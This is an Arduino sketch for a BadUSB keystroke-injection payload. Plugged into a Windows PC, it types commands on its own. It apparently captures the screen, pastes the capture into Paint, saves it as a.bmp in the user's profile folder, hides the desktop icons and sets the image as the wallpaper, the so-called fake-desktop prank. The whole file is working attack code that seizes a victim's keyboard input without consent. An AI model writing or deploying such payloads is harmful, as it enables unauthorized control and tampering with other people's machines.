#include <HID-Project.h>
#include <HID-Settings.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(100);
  Keyboard.releaseAll();

  delay(500);

  typeKey(206);

  delay(100);

  typeKey(229);

  delay(300);

  Keyboard.print("V");

  delay(40);

  Keyboard.print("D");

  delay(300);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(700);

  Keyboard.print("mspaint");

  typeKey(KEY_RETURN);

  delay(1200);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(118);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(115);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("%userprofile%\\a.bmp");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(102);
  Keyboard.releaseAll();

  delay(400);

  Keyboard.print("K");

  delay(100);

  Keyboard.print("F");

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(300);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(100);
  Keyboard.releaseAll();

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
  AbsoluteMouse.end();
}

// Unused
void loop() {}